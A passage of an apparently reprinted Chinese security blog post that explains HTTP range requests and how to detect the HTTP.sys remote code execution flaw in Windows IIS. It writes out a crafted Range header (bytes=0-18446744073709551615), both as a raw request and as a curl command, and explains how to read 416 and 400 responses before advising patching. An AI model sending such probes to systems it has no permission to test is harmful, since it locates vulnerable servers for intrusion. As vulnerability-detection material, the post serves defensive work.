-<p>如果服务器支持范围请求，响应包中就会存在Accept-Ranges字段(且值不为“none”，bytes为资源范围的单位)，并在Content-Length字段中告诉客户端资源的大小范围。</p>
-<p><img src="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="image"></p>
-<p>如果没有Accept-Ranges字段，则服务器可能不支持范围请求，有的服务器会明确将值设为“none”。</p>
-<p>服务器面对范围请求，有三种响应：</p>
-<p>请求成功：</p>
-<p>响应206Partial Content请求范围越界：（范围超过资源的大小）</p>
-<p>响应416Requested Range Not Satisfiable不支持范围请求：</p>
-<p>响应200OK</p>
-<p>而HTTP.sys远程代码执行漏洞正是利用Range字段注入恶意数据。该漏洞的检测，也是利用服务器面对范围请求时的响应特征来判断。</p>
-</blockquote>
-<h2><span id="漏洞检测方法">漏洞检测方法</span></h2><blockquote>
-<p>1、先判断目标环境是否为Windows+IIS</p>
-<p>2、然后构建Range字段进行检测即可</p>
-<p>检测时，在请求包中添加Range字段，如下：</p>
-<p><code>Range: bytes=0-18446744073709551615</code></p>
-<p>【18446744073709551615的十六进制为0xFFFFFFFFFFFFFFFF(16个F)是64位无符号整数所能表达的最大整数，整数溢出和这个超大整数有关】</p>
-<p>然后go给服务器</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: stuff</span><br><span class="line">Range: <span class="built_in">bytes</span>=<span class="number">0</span>-<span class="number">18446744073709551615</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>或者：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v www.test.com -H <span class="string">&quot;Host: irrelevant&quot;</span> -H <span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>服务器响应 400，证明不存在HTTP.sys远程代码执行漏洞</p>
-<p><code>HTTP Error 400. The request has an invalid header name.</code></p>
-<p>服务器响应 416，则证明存在该漏洞</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">416</span> Requested Range Not Satisfiable</span><br><span class="line">Content-<span class="type">Type</span>: text/html</span><br><span class="line">Last-Modified: Thu, <span class="number">22</span> Aug <span class="number">2013</span> <span class="number">23</span>:<span class="number">53</span>:<span class="number">12</span> GMT</span><br><span class="line">Accept-Ranges: <span class="built_in">bytes</span></span><br><span class="line">ETag: <span class="string">&quot;2edebc2929fce1:0&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2><span id="漏洞修复建议">漏洞修复建议：</span></h2><blockquote>
-<p>升级安全补丁</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
